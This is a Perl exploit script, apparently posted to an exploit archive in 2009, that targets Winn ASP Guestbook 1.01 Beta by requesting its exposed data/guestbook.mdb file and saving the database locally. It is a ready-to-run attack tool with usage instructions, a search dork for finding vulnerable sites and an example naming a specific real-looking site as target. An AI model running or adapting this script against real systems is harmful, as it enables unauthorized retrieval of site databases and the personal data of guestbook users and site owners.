#!/usr/bin/perl -w
#
# Winn ASP Guestbook 1.01 Beta Database Disclosure Exploit
#
# Found By : ZoRLu
# 
# Home: yildirimordulari.com , dafgamers.com , z0rlu.blogspot.com
#
# Not: Bana Bug BulamIyorum, YapamIyorum Demeyin a.q Elin Gavuru YapIyor Sizler Niye YapamIyorsunuz. istemiyorsunuz isteseniz Sizlerde YaparsInÃ½z
#
# Thanks: Str0ke, Cyber-Zone, Stack, AlpHaNiX, W0cker, Dr.Ly0n, ThE g0bL!N and all Friends
#
# Download : http://winn.ws/downloads/asp-guestbook-v1-01.zip



use LWP::Simple;
use LWP::UserAgent;

system('cls');
system('title Winn ASP Guestbook 1.01 Beta Database Disclosure Exploit');
system('color 2');


if(@ARGV < 2)
{
print "[-]Exp KullanIm HatasI\n";
print "[-]Ornegi inceleyin\n\n";
&help; exit();
}
sub help()
{
print "[+] KullanIm : perl $0 url/IP Path \n";
print "[+] if your target have a path        : perl $0 site.com /path/ \n";
print "[+] example                           : perl $0 lifelinesydney.org /asp-guestbook/ \n";
print "[+] if your target doesnt have a path : perl $0 site.com / \n";
print "[+] example                           : perl $0 localhost / \n";
}

print "\n************************************************************************\n";
print "\*   Winn ASP Guestbook 1.01 Beta Database Disclosure Exploit            *\n";
print "\*             Exploited By : ZoRLu                                      *\n";
print "\*                      msn : trt-turk[at]hotmail.com                    *\n";
print "\*                     Home : yildirimordulari.com , dafgamers.com       *\n";
print "\*                      Dork: Winn ASP Guestbook from Winn.ws            *\n";
print "\*************************************************************************\n\n\n";

($TargetIP, $path, $File,) = @ARGV;

$File="data/guestbook.mdb";
my $url = "http://" . $TargetIP . $path . $File;
print "\n                        WWW.YiLDiRiMORDULARi.COM\n\n";
print "\n                                   wait!!!      \n\n";

my $useragent = LWP::UserAgent->new();
my $request   = $useragent->get($url,":content_file" => "C:/db.mdb");

if ($request->is_success) 
{
print "[+] $url Exploited!\n\n";
print "[+] Database saved to C:/db.mdb\n";
exit();
}
else 
{
print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
exit();
}

# milw0rm.com [2009-05-04]